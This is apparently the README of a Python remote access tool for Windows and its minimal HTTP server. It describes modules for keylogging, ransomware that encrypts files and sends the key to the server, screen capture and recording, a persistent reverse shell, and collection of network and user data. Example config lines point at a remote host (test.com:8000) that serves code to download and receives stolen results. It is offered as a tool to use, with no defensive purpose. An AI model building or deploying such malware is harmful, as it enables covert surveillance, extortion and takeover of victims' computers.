A simple windows remote access tool. After every 24 hours it will donwload a configuration file and modules from the server.
Dynamically import and run modules. Uploads the module results after module interval periods.
So it only needs to install the winrat.py file first to start RAT.

winrat.conf:

    Usage: <operation> <name/link> <reload interval>
    
    Example: 
             m screenshot 200 # m = module
             d http://test.com:8000/ # d = download link. Module and configuration download link
             u http://test.com:8000/ # u = upload link. Results upload link

Modules implemented:

    1. Keylogger:
        * Separate words when newline or space is pressed or no key pressed for 15 seconds
    
    2. Ransomware
        Encryption: 
            * Recursively encrypts every files in a given directory with AES encryption
            * AES encryption key is sent to the server
            * TODO: Send the encrypted file names to the server along with encryption key
        Decrytion:
            * AES decryption key is fetched from server based on the mac address of client
            * Decrypt only files which were encrypted and also in encryption_file_names.txt
            * TODO: Get the encrypted file names list from the server
    
    3. Screenshot:
        * Takes a screenshot after at each run

    4. Screenrecord:
        * Records only the primary display for a given duration at each run

    5. Remote shell:
        * Start a reverse shell and try to reconnect untill next reload of system

    6. System Informations:
        * Sends the mac address, public ip, private ip, user lists, open ports to the server
    
    7. Encrypts files before sending to server

Server:
    A very minimal http server is created to handle the request. A simple api server will suffice.
    Functionalities:
    
        1. GET requests:
            * Handle request for configuration and modules files
            * Handle request for ranswomware decryption key
            * TODO: Send the encrypted file names list along with the decryption key

        2. POST requests:
            * Handle module results sent back from the client
            * TODO: Use database to store the results
